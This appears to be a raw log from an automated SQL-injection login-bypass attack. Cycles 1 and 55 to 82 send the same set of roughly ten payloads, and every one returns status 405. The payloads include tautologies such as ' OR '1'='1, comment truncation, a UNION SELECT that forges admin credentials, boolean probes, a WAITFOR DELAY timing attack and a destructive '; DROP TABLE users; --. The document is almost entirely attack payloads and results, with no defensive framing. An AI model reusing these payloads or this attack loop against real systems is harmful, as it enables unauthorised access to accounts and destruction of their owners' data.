2026-04-19 16:36:41 | SQLI_BYPASS | cycle=1 | query=' OR '1'='1 | status=405
2026-04-19 16:38:31 | SQLI_BYPASS | cycle=55 | query=admin' # | status=405
2026-04-19 16:38:31 | SQLI_BYPASS | cycle=55 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:38:31 | SQLI_BYPASS | cycle=55 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:38:32 | SQLI_BYPASS | cycle=55 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:38:32 | SQLI_BYPASS | cycle=55 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:38:32 | SQLI_BYPASS | cycle=55 | query=admin' OR 'a'='a | status=405
2026-04-19 16:38:32 | SQLI_BYPASS | cycle=55 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:38:32 | SQLI_BYPASS | cycle=55 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:38:33 | SQLI_BYPASS | cycle=56 | query=' OR '1'='1 | status=405
2026-04-19 16:38:33 | SQLI_BYPASS | cycle=56 | query=admin' -- | status=405
2026-04-19 16:38:33 | SQLI_BYPASS | cycle=56 | query=admin' # | status=405
2026-04-19 16:38:33 | SQLI_BYPASS | cycle=56 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:38:33 | SQLI_BYPASS | cycle=56 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:38:34 | SQLI_BYPASS | cycle=56 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:38:34 | SQLI_BYPASS | cycle=56 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:38:34 | SQLI_BYPASS | cycle=56 | query=admin' OR 'a'='a | status=405
2026-04-19 16:38:34 | SQLI_BYPASS | cycle=56 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:38:34 | SQLI_BYPASS | cycle=56 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:38:35 | SQLI_BYPASS | cycle=57 | query=' OR '1'='1 | status=405
2026-04-19 16:38:35 | SQLI_BYPASS | cycle=57 | query=admin' -- | status=405
2026-04-19 16:38:35 | SQLI_BYPASS | cycle=57 | query=admin' # | status=405
2026-04-19 16:38:35 | SQLI_BYPASS | cycle=57 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:38:36 | SQLI_BYPASS | cycle=57 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:38:36 | SQLI_BYPASS | cycle=57 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:38:36 | SQLI_BYPASS | cycle=57 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:38:36 | SQLI_BYPASS | cycle=57 | query=admin' OR 'a'='a | status=405
2026-04-19 16:38:36 | SQLI_BYPASS | cycle=57 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:38:36 | SQLI_BYPASS | cycle=57 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:38:37 | SQLI_BYPASS | cycle=58 | query=' OR '1'='1 | status=405
2026-04-19 16:38:37 | SQLI_BYPASS | cycle=58 | query=admin' -- | status=405
2026-04-19 16:38:37 | SQLI_BYPASS | cycle=58 | query=admin' # | status=405
2026-04-19 16:38:37 | SQLI_BYPASS | cycle=58 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:38:37 | SQLI_BYPASS | cycle=58 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:38:37 | SQLI_BYPASS | cycle=58 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:38:38 | SQLI_BYPASS | cycle=58 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:38:38 | SQLI_BYPASS | cycle=58 | query=admin' OR 'a'='a | status=405
2026-04-19 16:38:38 | SQLI_BYPASS | cycle=58 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:38:38 | SQLI_BYPASS | cycle=58 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:38:39 | SQLI_BYPASS | cycle=59 | query=' OR '1'='1 | status=405
2026-04-19 16:38:39 | SQLI_BYPASS | cycle=59 | query=admin' -- | status=405
2026-04-19 16:38:39 | SQLI_BYPASS | cycle=59 | query=admin' # | status=405
2026-04-19 16:38:39 | SQLI_BYPASS | cycle=59 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:38:39 | SQLI_BYPASS | cycle=59 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:38:39 | SQLI_BYPASS | cycle=59 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:38:39 | SQLI_BYPASS | cycle=59 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:38:40 | SQLI_BYPASS | cycle=59 | query=admin' OR 'a'='a | status=405
2026-04-19 16:38:40 | SQLI_BYPASS | cycle=59 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:38:40 | SQLI_BYPASS | cycle=59 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:38:40 | SQLI_BYPASS | cycle=60 | query=' OR '1'='1 | status=405
2026-04-19 16:38:40 | SQLI_BYPASS | cycle=60 | query=admin' -- | status=405
2026-04-19 16:38:40 | SQLI_BYPASS | cycle=60 | query=admin' # | status=405
2026-04-19 16:38:41 | SQLI_BYPASS | cycle=60 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:38:41 | SQLI_BYPASS | cycle=60 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:38:41 | SQLI_BYPASS | cycle=60 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:38:41 | SQLI_BYPASS | cycle=60 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:38:42 | SQLI_BYPASS | cycle=60 | query=admin' OR 'a'='a | status=405
2026-04-19 16:38:42 | SQLI_BYPASS | cycle=60 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:38:42 | SQLI_BYPASS | cycle=60 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:38:42 | SQLI_BYPASS | cycle=61 | query=' OR '1'='1 | status=405
2026-04-19 16:38:42 | SQLI_BYPASS | cycle=61 | query=admin' -- | status=405
2026-04-19 16:38:43 | SQLI_BYPASS | cycle=61 | query=admin' # | status=405
2026-04-19 16:38:43 | SQLI_BYPASS | cycle=61 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:38:43 | SQLI_BYPASS | cycle=61 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:38:43 | SQLI_BYPASS | cycle=61 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:38:43 | SQLI_BYPASS | cycle=61 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:38:43 | SQLI_BYPASS | cycle=61 | query=admin' OR 'a'='a | status=405
2026-04-19 16:38:44 | SQLI_BYPASS | cycle=61 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:38:44 | SQLI_BYPASS | cycle=61 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:38:44 | SQLI_BYPASS | cycle=62 | query=' OR '1'='1 | status=405
2026-04-19 16:38:45 | SQLI_BYPASS | cycle=62 | query=admin' -- | status=405
2026-04-19 16:38:45 | SQLI_BYPASS | cycle=62 | query=admin' # | status=405
2026-04-19 16:38:45 | SQLI_BYPASS | cycle=62 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:38:45 | SQLI_BYPASS | cycle=62 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:38:45 | SQLI_BYPASS | cycle=62 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:38:45 | SQLI_BYPASS | cycle=62 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:38:46 | SQLI_BYPASS | cycle=62 | query=admin' OR 'a'='a | status=405
2026-04-19 16:38:46 | SQLI_BYPASS | cycle=62 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:38:46 | SQLI_BYPASS | cycle=62 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:38:46 | SQLI_BYPASS | cycle=63 | query=' OR '1'='1 | status=405
2026-04-19 16:38:46 | SQLI_BYPASS | cycle=63 | query=admin' -- | status=405
2026-04-19 16:38:47 | SQLI_BYPASS | cycle=63 | query=admin' # | status=405
2026-04-19 16:38:47 | SQLI_BYPASS | cycle=63 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:38:47 | SQLI_BYPASS | cycle=63 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:38:47 | SQLI_BYPASS | cycle=63 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:38:48 | SQLI_BYPASS | cycle=63 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:38:48 | SQLI_BYPASS | cycle=63 | query=admin' OR 'a'='a | status=405
2026-04-19 16:38:48 | SQLI_BYPASS | cycle=63 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:38:48 | SQLI_BYPASS | cycle=63 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:38:48 | SQLI_BYPASS | cycle=64 | query=' OR '1'='1 | status=405
2026-04-19 16:38:48 | SQLI_BYPASS | cycle=64 | query=admin' -- | status=405
2026-04-19 16:38:49 | SQLI_BYPASS | cycle=64 | query=admin' # | status=405
2026-04-19 16:38:49 | SQLI_BYPASS | cycle=64 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:38:49 | SQLI_BYPASS | cycle=64 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:38:49 | SQLI_BYPASS | cycle=64 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:38:49 | SQLI_BYPASS | cycle=64 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:38:50 | SQLI_BYPASS | cycle=64 | query=admin' OR 'a'='a | status=405
2026-04-19 16:38:50 | SQLI_BYPASS | cycle=64 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:38:50 | SQLI_BYPASS | cycle=64 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:38:50 | SQLI_BYPASS | cycle=65 | query=' OR '1'='1 | status=405
2026-04-19 16:38:50 | SQLI_BYPASS | cycle=65 | query=admin' -- | status=405
2026-04-19 16:38:51 | SQLI_BYPASS | cycle=65 | query=admin' # | status=405
2026-04-19 16:38:51 | SQLI_BYPASS | cycle=65 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:38:51 | SQLI_BYPASS | cycle=65 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:38:51 | SQLI_BYPASS | cycle=65 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:38:51 | SQLI_BYPASS | cycle=65 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:38:52 | SQLI_BYPASS | cycle=65 | query=admin' OR 'a'='a | status=405
2026-04-19 16:38:52 | SQLI_BYPASS | cycle=65 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:38:52 | SQLI_BYPASS | cycle=65 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:38:52 | SQLI_BYPASS | cycle=66 | query=' OR '1'='1 | status=405
2026-04-19 16:38:53 | SQLI_BYPASS | cycle=66 | query=admin' -- | status=405
2026-04-19 16:38:53 | SQLI_BYPASS | cycle=66 | query=admin' # | status=405
2026-04-19 16:38:53 | SQLI_BYPASS | cycle=66 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:38:53 | SQLI_BYPASS | cycle=66 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:38:53 | SQLI_BYPASS | cycle=66 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:38:54 | SQLI_BYPASS | cycle=66 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:38:54 | SQLI_BYPASS | cycle=66 | query=admin' OR 'a'='a | status=405
2026-04-19 16:38:54 | SQLI_BYPASS | cycle=66 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:38:54 | SQLI_BYPASS | cycle=66 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:38:54 | SQLI_BYPASS | cycle=67 | query=' OR '1'='1 | status=405
2026-04-19 16:38:55 | SQLI_BYPASS | cycle=67 | query=admin' -- | status=405
2026-04-19 16:38:55 | SQLI_BYPASS | cycle=67 | query=admin' # | status=405
2026-04-19 16:38:55 | SQLI_BYPASS | cycle=67 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:38:55 | SQLI_BYPASS | cycle=67 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:38:55 | SQLI_BYPASS | cycle=67 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:38:55 | SQLI_BYPASS | cycle=67 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:38:56 | SQLI_BYPASS | cycle=67 | query=admin' OR 'a'='a | status=405
2026-04-19 16:38:56 | SQLI_BYPASS | cycle=67 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:38:56 | SQLI_BYPASS | cycle=67 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:38:56 | SQLI_BYPASS | cycle=68 | query=' OR '1'='1 | status=405
2026-04-19 16:38:57 | SQLI_BYPASS | cycle=68 | query=admin' -- | status=405
2026-04-19 16:38:57 | SQLI_BYPASS | cycle=68 | query=admin' # | status=405
2026-04-19 16:38:57 | SQLI_BYPASS | cycle=68 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:38:57 | SQLI_BYPASS | cycle=68 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:38:57 | SQLI_BYPASS | cycle=68 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:38:58 | SQLI_BYPASS | cycle=68 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:38:58 | SQLI_BYPASS | cycle=68 | query=admin' OR 'a'='a | status=405
2026-04-19 16:38:58 | SQLI_BYPASS | cycle=68 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:38:58 | SQLI_BYPASS | cycle=68 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:38:58 | SQLI_BYPASS | cycle=69 | query=' OR '1'='1 | status=405
2026-04-19 16:38:59 | SQLI_BYPASS | cycle=69 | query=admin' -- | status=405
2026-04-19 16:38:59 | SQLI_BYPASS | cycle=69 | query=admin' # | status=405
2026-04-19 16:38:59 | SQLI_BYPASS | cycle=69 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:39:00 | SQLI_BYPASS | cycle=69 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:39:00 | SQLI_BYPASS | cycle=69 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:39:00 | SQLI_BYPASS | cycle=69 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:39:00 | SQLI_BYPASS | cycle=69 | query=admin' OR 'a'='a | status=405
2026-04-19 16:39:00 | SQLI_BYPASS | cycle=69 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:39:01 | SQLI_BYPASS | cycle=69 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:39:01 | SQLI_BYPASS | cycle=70 | query=' OR '1'='1 | status=405
2026-04-19 16:39:01 | SQLI_BYPASS | cycle=70 | query=admin' -- | status=405
2026-04-19 16:39:01 | SQLI_BYPASS | cycle=70 | query=admin' # | status=405
2026-04-19 16:39:01 | SQLI_BYPASS | cycle=70 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:39:01 | SQLI_BYPASS | cycle=70 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:39:02 | SQLI_BYPASS | cycle=70 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:39:02 | SQLI_BYPASS | cycle=70 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:39:02 | SQLI_BYPASS | cycle=70 | query=admin' OR 'a'='a | status=405
2026-04-19 16:39:02 | SQLI_BYPASS | cycle=70 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:39:02 | SQLI_BYPASS | cycle=70 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:39:02 | SQLI_BYPASS | cycle=71 | query=' OR '1'='1 | status=405
2026-04-19 16:39:03 | SQLI_BYPASS | cycle=71 | query=admin' -- | status=405
2026-04-19 16:39:03 | SQLI_BYPASS | cycle=71 | query=admin' # | status=405
2026-04-19 16:39:03 | SQLI_BYPASS | cycle=71 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:39:03 | SQLI_BYPASS | cycle=71 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:39:03 | SQLI_BYPASS | cycle=71 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:39:04 | SQLI_BYPASS | cycle=71 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:39:04 | SQLI_BYPASS | cycle=71 | query=admin' OR 'a'='a | status=405
2026-04-19 16:39:04 | SQLI_BYPASS | cycle=71 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:39:04 | SQLI_BYPASS | cycle=71 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:39:04 | SQLI_BYPASS | cycle=72 | query=' OR '1'='1 | status=405
2026-04-19 16:39:05 | SQLI_BYPASS | cycle=72 | query=admin' -- | status=405
2026-04-19 16:39:05 | SQLI_BYPASS | cycle=72 | query=admin' # | status=405
2026-04-19 16:39:05 | SQLI_BYPASS | cycle=72 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:39:05 | SQLI_BYPASS | cycle=72 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:39:06 | SQLI_BYPASS | cycle=72 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:39:06 | SQLI_BYPASS | cycle=72 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:39:06 | SQLI_BYPASS | cycle=72 | query=admin' OR 'a'='a | status=405
2026-04-19 16:39:06 | SQLI_BYPASS | cycle=72 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:39:06 | SQLI_BYPASS | cycle=72 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:39:07 | SQLI_BYPASS | cycle=73 | query=' OR '1'='1 | status=405
2026-04-19 16:39:07 | SQLI_BYPASS | cycle=73 | query=admin' -- | status=405
2026-04-19 16:39:07 | SQLI_BYPASS | cycle=73 | query=admin' # | status=405
2026-04-19 16:39:07 | SQLI_BYPASS | cycle=73 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:39:07 | SQLI_BYPASS | cycle=73 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:39:08 | SQLI_BYPASS | cycle=73 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:39:08 | SQLI_BYPASS | cycle=73 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:39:08 | SQLI_BYPASS | cycle=73 | query=admin' OR 'a'='a | status=405
2026-04-19 16:39:08 | SQLI_BYPASS | cycle=73 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:39:08 | SQLI_BYPASS | cycle=73 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:39:08 | SQLI_BYPASS | cycle=74 | query=' OR '1'='1 | status=405
2026-04-19 16:39:09 | SQLI_BYPASS | cycle=74 | query=admin' -- | status=405
2026-04-19 16:39:09 | SQLI_BYPASS | cycle=74 | query=admin' # | status=405
2026-04-19 16:39:09 | SQLI_BYPASS | cycle=74 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:39:09 | SQLI_BYPASS | cycle=74 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:39:09 | SQLI_BYPASS | cycle=74 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:39:09 | SQLI_BYPASS | cycle=74 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:39:10 | SQLI_BYPASS | cycle=74 | query=admin' OR 'a'='a | status=405
2026-04-19 16:39:10 | SQLI_BYPASS | cycle=74 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:39:10 | SQLI_BYPASS | cycle=74 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:39:10 | SQLI_BYPASS | cycle=75 | query=' OR '1'='1 | status=405
2026-04-19 16:39:10 | SQLI_BYPASS | cycle=75 | query=admin' -- | status=405
2026-04-19 16:39:11 | SQLI_BYPASS | cycle=75 | query=admin' # | status=405
2026-04-19 16:39:11 | SQLI_BYPASS | cycle=75 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:39:11 | SQLI_BYPASS | cycle=75 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:39:11 | SQLI_BYPASS | cycle=75 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:39:11 | SQLI_BYPASS | cycle=75 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:39:12 | SQLI_BYPASS | cycle=75 | query=admin' OR 'a'='a | status=405
2026-04-19 16:39:12 | SQLI_BYPASS | cycle=75 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:39:12 | SQLI_BYPASS | cycle=75 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:39:12 | SQLI_BYPASS | cycle=76 | query=' OR '1'='1 | status=405
2026-04-19 16:39:12 | SQLI_BYPASS | cycle=76 | query=admin' -- | status=405
2026-04-19 16:39:13 | SQLI_BYPASS | cycle=76 | query=admin' # | status=405
2026-04-19 16:39:13 | SQLI_BYPASS | cycle=76 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:39:13 | SQLI_BYPASS | cycle=76 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:39:13 | SQLI_BYPASS | cycle=76 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:39:13 | SQLI_BYPASS | cycle=76 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:39:13 | SQLI_BYPASS | cycle=76 | query=admin' OR 'a'='a | status=405
2026-04-19 16:39:14 | SQLI_BYPASS | cycle=76 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:39:14 | SQLI_BYPASS | cycle=76 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:39:14 | SQLI_BYPASS | cycle=77 | query=' OR '1'='1 | status=405
2026-04-19 16:39:14 | SQLI_BYPASS | cycle=77 | query=admin' -- | status=405
2026-04-19 16:39:14 | SQLI_BYPASS | cycle=77 | query=admin' # | status=405
2026-04-19 16:39:15 | SQLI_BYPASS | cycle=77 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:39:15 | SQLI_BYPASS | cycle=77 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:39:15 | SQLI_BYPASS | cycle=77 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:39:15 | SQLI_BYPASS | cycle=77 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:39:15 | SQLI_BYPASS | cycle=77 | query=admin' OR 'a'='a | status=405
2026-04-19 16:39:16 | SQLI_BYPASS | cycle=77 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:39:16 | SQLI_BYPASS | cycle=77 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:39:16 | SQLI_BYPASS | cycle=78 | query=' OR '1'='1 | status=405
2026-04-19 16:39:16 | SQLI_BYPASS | cycle=78 | query=admin' -- | status=405
2026-04-19 16:39:16 | SQLI_BYPASS | cycle=78 | query=admin' # | status=405
2026-04-19 16:39:17 | SQLI_BYPASS | cycle=78 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:39:17 | SQLI_BYPASS | cycle=78 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:39:17 | SQLI_BYPASS | cycle=78 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:39:17 | SQLI_BYPASS | cycle=78 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:39:17 | SQLI_BYPASS | cycle=78 | query=admin' OR 'a'='a | status=405
2026-04-19 16:39:18 | SQLI_BYPASS | cycle=78 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:39:18 | SQLI_BYPASS | cycle=78 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:39:18 | SQLI_BYPASS | cycle=79 | query=' OR '1'='1 | status=405
2026-04-19 16:39:18 | SQLI_BYPASS | cycle=79 | query=admin' -- | status=405
2026-04-19 16:39:18 | SQLI_BYPASS | cycle=79 | query=admin' # | status=405
2026-04-19 16:39:19 | SQLI_BYPASS | cycle=79 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:39:19 | SQLI_BYPASS | cycle=79 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:39:19 | SQLI_BYPASS | cycle=79 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:39:19 | SQLI_BYPASS | cycle=79 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:39:19 | SQLI_BYPASS | cycle=79 | query=admin' OR 'a'='a | status=405
2026-04-19 16:39:20 | SQLI_BYPASS | cycle=79 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:39:20 | SQLI_BYPASS | cycle=79 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:39:20 | SQLI_BYPASS | cycle=80 | query=' OR '1'='1 | status=405
2026-04-19 16:39:20 | SQLI_BYPASS | cycle=80 | query=admin' -- | status=405
2026-04-19 16:39:20 | SQLI_BYPASS | cycle=80 | query=admin' # | status=405
2026-04-19 16:39:21 | SQLI_BYPASS | cycle=80 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:39:21 | SQLI_BYPASS | cycle=80 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:39:21 | SQLI_BYPASS | cycle=80 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:39:21 | SQLI_BYPASS | cycle=80 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:39:22 | SQLI_BYPASS | cycle=80 | query=admin' OR 'a'='a | status=405
2026-04-19 16:39:22 | SQLI_BYPASS | cycle=80 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:39:22 | SQLI_BYPASS | cycle=80 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:39:22 | SQLI_BYPASS | cycle=81 | query=' OR '1'='1 | status=405
2026-04-19 16:39:22 | SQLI_BYPASS | cycle=81 | query=admin' -- | status=405
2026-04-19 16:39:23 | SQLI_BYPASS | cycle=81 | query=admin' # | status=405
2026-04-19 16:39:23 | SQLI_BYPASS | cycle=81 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:39:23 | SQLI_BYPASS | cycle=81 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:39:23 | SQLI_BYPASS | cycle=81 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:39:23 | SQLI_BYPASS | cycle=81 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:39:24 | SQLI_BYPASS | cycle=81 | query=admin' OR 'a'='a | status=405
2026-04-19 16:39:24 | SQLI_BYPASS | cycle=81 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:39:24 | SQLI_BYPASS | cycle=81 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:39:24 | SQLI_BYPASS | cycle=82 | query=' OR '1'='1 | status=405
2026-04-19 16:39:24 | SQLI_BYPASS | cycle=82 | query=admin' -- | status=405
2026-04-19 16:39:24 | SQLI_BYPASS | cycle=82 | query=admin' # | status=405
